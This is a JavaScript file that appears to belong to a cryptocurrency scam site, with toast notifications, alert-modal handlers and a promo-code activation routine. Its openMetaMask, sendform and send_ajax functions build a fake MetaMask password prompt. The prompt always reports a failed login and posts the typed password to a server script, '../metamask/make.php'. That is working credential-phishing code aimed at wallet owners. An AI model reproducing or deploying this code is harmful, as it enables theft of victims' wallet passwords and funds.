 function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

  
 

    function copyToClipboard(elementId) {

      // Create a "hidden" input
      var aux = document.createElement("input");

      // Assign it the value of the specified element
      aux.setAttribute("value", document.getElementById(elementId).innerHTML);

      // Append it to the body
      document.body.appendChild(aux);

      // Highlight its content
      aux.select();

      // Copy the highlighted text
      document.execCommand("copy");

      // Remove it from the body
      document.body.removeChild(aux);

      noti("Link copied to bash clipboard", "success");

    }

    $("#copy_link").on("click", function(e) {
      e.preventDefault();

      // Create a "hidden" input
      var aux = document.createElement("input");

      // Assign it the value of the specified element
      aux.setAttribute("value", document.getElementById("link_text").value);

      // Append it to the body
      document.body.appendChild(aux);

      // Highlight its content
      aux.select();

      // Copy the highlighted text
      document.execCommand("copy");

      // Remove it from the body
      document.body.removeChild(aux);

      noti("Link copied to bash clipboard", "success");

    });

    $("#activate_promo").on("click", function(e) {
        e.preventDefault();

        var promocode = $("#promocode").val();
        if(promocode == "") {
            noti("Please enter correct promo code", "error");
        } else {
           $.ajax({
              url: "../ajax/ajax",
              type: "POST",
              data: {
                action: "ACTIVATE_PROMOCODE",
                promo_code: promocode
              },
              success: function(response) {
                console.log(response);
                if(response == "1") {
                  noti("Promo code successfully activated", "success");
                } else if(response == "2") {
                  noti("Please enter correct promo code", "error");
                } else if(response == "3") {
                  noti("This promo code does not exist", "error");
                } else if(response == "4") {
                  noti("An unexpected error has occurred, please try again", "error");
                } else if(response == "5") {
                  noti("You have already activated this promo code", "error");
                } else {
                  var json = JSON.parse(response);
                  var promo_activate = json['promo_activate'];

                  noti(promo_activate, "success");
                }

              }
            })  
        }
        
    });